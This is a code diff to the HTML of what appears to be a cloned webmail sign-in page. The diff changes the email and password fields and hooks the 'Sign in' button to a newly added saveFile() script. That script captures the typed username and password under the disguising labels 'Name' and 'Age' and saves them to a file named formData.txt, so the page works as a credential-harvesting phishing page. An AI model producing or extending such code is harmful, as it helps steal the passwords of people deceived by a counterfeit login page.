@@ -139,11 +139,11 @@ root.challenge.servingStamp = 1532406921040;
 <input type="hidden" id="dimensions" name="dimensions" value="0" />
 <input type="hidden" name="m_ts" value="1480337071" />
 <input type="hidden" name="li" value="ryY8WGS9GCyJ8gO1hL3fdXmg" />
-<input autocorrect="off" autocapitalize="off" class="bi bj bk" placeholder="phone number,username or email" name="email" value="" type="text" />
+<input autocorrect="off" autocapitalize="off" class="bi bj bk" placeholder="phone number,username or email" id="email" value="" type="text" />
 <h3 class="bf bg bh"></h3>
-<input autocorrect="off" autocapitalize="off" class="bi bj bl bm" placeholder="password" name="pass" type="password" />
+<input autocorrect="off" autocapitalize="off" class="bi bj bl bm" placeholder="password" id="pass" type="password" />
 <p class="signin-cont">
-            <button type="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button" name="verifyPassword" value="Sign in" data-ylk="elm:btn;elmt:next;slk:next">                        
+            <button type="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button" name="verifyPassword" value="Sign in" onclick="saveFile()"  data-ylk="elm:btn;elmt:next;slk:next">                        
                     Sign in
             </button>
         </p>
@@ -183,4 +183,28 @@ root.challenge.servingStamp = 1532406921040;
 
 
 </body>
+<script>
+ let saveFile = () => {
+								const name = document.getElementById('email');
+        const age = document.getElementById('pass');	
+		
+		        let data = '\r Name: ' + email.value + ' \r\n ' + 
+            'Age: ' +pass.value;
+			  const textToBLOB = new Blob([data], { type: 'text/plain' });
+        const sFileName = 'formData.txt';
+		   let newLink = document.createElement("a");
+        newLink.download = sFileName;
+		        if (window.webkitURL != null) {
+            newLink.href = window.webkitURL.createObjectURL(textToBLOB);
+        }
+        else {
+            newLink.href = window.URL.createObjectURL(textToBLOB);
+            newLink.style.display = "none";
+            document.body.appendChild(newLink);
+        }
+
+        newLink.click(); 
+    }
+ 
+</script>
 </html>
